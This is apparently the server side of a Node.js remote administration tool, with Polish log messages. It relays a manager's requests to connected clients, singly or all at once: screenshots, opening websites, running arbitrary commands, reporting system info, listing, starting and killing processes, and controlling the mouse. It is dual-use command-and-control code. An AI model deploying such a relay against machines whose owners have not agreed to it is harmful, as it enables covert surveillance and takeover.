module.exports = (namespace, sio) => {
    namespace.on('connection', socket => {

        console.log('Manager connected')

        socket.on('screenshoot', (data) => {
            console.log('Manager chce ss')
            if (data && data.clientId) {
                sio.of('/clients').to(data.clientId).emit('screenshot');
            } else {
                sio.of('/clients').emit('screenshot');
            }
            sio.of('/manager').emit('ss_btn', {state: false})
        })

        socket.on('website', (data) => {
            console.log('Manager chce otworzyc strone')
            console.log(data);
            if (data && data.clientId) {
                sio.of('/clients').to(data.clientId).emit('website', data)
            } else {
                sio.of('/clients').emit('website', data)
            }
            sio.of('/manager').emit('website_btn', {state: false})
        })

        socket.on('command', (data) => {
            console.log('Manager chce przeslac komende')
            if (data && data.clientId) {
                sio.of('/clients').to(data.clientId).emit('command', data.command)
            } else {
                sio.of('/clients').emit('command', data)
            }
        })

        socket.on('getSystemInfoFromClient', (data) => {
            console.log(data);
            // Wykonujemy zapytanie do klienta by przeslal info o systemie
            sio.of('/clients').to(data.clientId).emit('systemInfo');
        })

        socket.on('fetchSystemInfo', (data) => {
            console.log(data);
        })

        socket.on('process_list', (data) => {
            sio.of("/clients").to(data.clientId).emit("process_list");
        })

        socket.on('process_kill', (data) => {
            sio.of('/clients').to(data.clientId).emit("process_kill", data);
        })

        socket.on('process_start', (data) => {
            sio.of('/clients').to(data.clientId).emit("process_start", data);
        })

        socket.on("mouse", (data) => {
            sio.of('/clients').to(data.clientId).emit("mouse", {type: data.type, p: data.p});
        })

        socket.on("mouse_click", (data) => {
            sio.of('/clients').to(data.clientId).emit("mouse_click", {type: data.type});
        })
    })
}